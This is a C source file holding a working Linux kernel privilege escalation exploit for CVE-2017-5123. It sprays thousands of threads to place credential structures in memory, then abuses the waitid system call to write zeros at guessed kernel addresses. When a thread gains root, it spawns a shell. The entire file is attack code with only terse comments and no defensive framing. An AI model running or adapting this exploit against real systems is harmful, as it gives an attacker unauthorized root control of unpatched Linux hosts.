#define _GNU_SOURCE
#include <stdint.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <asm/unistd_64.h>
/*** Vulnerable code ***/
/*
* unsafe_put_user(signo, &infop->si_signo, Efault); // Write 0 anywhere. Offset 0 from the start
*	unsafe_put_user(0, &infop->si_errno, Efault);
*	unsafe_put_user(info.cause, &infop->si_code, Efault);
*	unsafe_put_user(info.pid, &infop->si_pid, Efault);
*	unsafe_put_user(info.uid, &infop->si_uid, Efault);
*	unsafe_put_user(info.status, &infop->si_status, Efault);
*/
#define MAX_THREADS 19970
struct shared_area{
  int one_win;
};
struct shared_area glob_var;

// Sprayed thread
int spray_thread(void *arg){
  int uid;
  int previous_one = syscall(__NR_getuid);
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(1, &set);
  if (syscall(__NR_sched_setaffinity,0, sizeof(cpu_set_t), &set) < 0) {
    perror("[-] sched_setaffinity");
    return -1;
   }
  // Loop over syscall getUID
  while(1){
    uid = syscall(__NR_getuid);
    //printf("UID: %d\n",uid);
    // If returned UID is different from the previous one, then we hit a struct cred area
    if (uid != previous_one){
      printf("WIN!! with %d", uid);
      // Kill other treads in order to stabilize the system
      glob_var.one_win = 1;
      // Simply spawn a shell
      system("/bin/sh");
    }
    if(glob_var.one_win == 1)
      return 1;
  }
  return 0;
}

// -==================[ Trigger the bug ]==================- {{{
int thread_ready;
int die_thread(void *arg){
  thread_ready=1;
  syscall(__NR_sched_yield);
  return 0;
}
void *stack;
int trigger_bug(uint64_t where, int what){
  printf("[0] Trying to overwrite 0x%016lx\r", where);
  //int pid = fork();
  thread_ready = 0;
  int pid = clone(die_thread, stack, CLONE_VM | CLONE_FS|CLONE_FILES|CLONE_SYSVSEM | SIGCHLD, NULL);
  int err;
  while(thread_ready == 0) {syscall(__NR_sched_yield);}
  err = syscall(__NR_waitid, P_PID, pid, where, WEXITED, NULL);   
  return err;
}
// }}}

int main(){
  printf("\n\n");
  printf("-={CVE-2017-5123}=-\n");
  printf("\n\n");
  uint64_t start_address;
  int x,i, pid;
  cpu_set_t set;
  siginfo_t test;
  char *stackTop;
  char *STACKS[MAX_THREADS];
  int PIDS[MAX_THREADS];
  printf("[0] Move this thread to CPU0\n");
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (syscall(__NR_sched_setaffinity,0, sizeof(cpu_set_t), &set) < 0) {
    perror("[-] sched_setaffinity");
    return -1;
   }
#define STACK_SIZE 4096
  // Prepare stack for "trigger" thread 
  stack=malloc(STACK_SIZE)+STACK_SIZE;
  glob_var.one_win = 0;
  for(x=0;x<MAX_THREADS;x++){
    stackTop = malloc(STACK_SIZE) + STACK_SIZE;
    if (!stackTop){
      perror("[-] Malloc");
      return -1;
    }
    STACKS[x] = stackTop;
    pid = clone(spray_thread, stackTop, CLONE_VM | CLONE_FS|CLONE_FILES|CLONE_SYSVSEM | SIGCHLD, NULL);
    if (pid == -1){
      perror("\n\nCLONE");
      return -1;
    }
    printf("[0] Process created: %d\r", x);
    PIDS[x] = pid;
  }
  sleep(1);
  setvbuf(stdout, NULL, _IONBF, 0);
  printf("\n\n[!] It's time to DIE!\n\n"); 
  x=0;
  // This is arbitrary
  start_address = 0xffff880166408000;
  while(start_address < 0xffff88016ffff000){
    trigger_bug(start_address, 0x0);
    sleep(3);
    if (glob_var.one_win == 1) {
      for(x=0;x<MAX_THREADS;x++) 
        // At least one thread will not exit
        waitid(P_ALL,0,&test,WEXITED);
      return 1;
    }
    while(1){
      // I noticied that sometimes a thread will crash... If it is the case we can respawn it
      memset(&test, 0, sizeof(siginfo_t));
      waitid(P_ALL, 0, &test, WEXITED | WNOHANG);
      if(test.si_pid != 0){
        printf("[:(] Process %d is dead!\n", test.si_pid);
        for(x=0;x<MAX_THREADS;x++)
          if(PIDS[x] == test.si_pid)
            break;
        pid = clone(spray_thread, STACKS[x], CLONE_VM | CLONE_FS|CLONE_FILES|CLONE_SYSVSEM | SIGCHLD, NULL);
        if (pid == -1){
          perror("[-] CLONE");
          return -1;
        }
        printf("[0] Process created: %d\r", x);
        PIDS[x] = pid;
      }
      else
        break;
    }
  start_address+=0x1000; 
  }
  printf("[:(] Bad luck...\n");
  return 0;
}
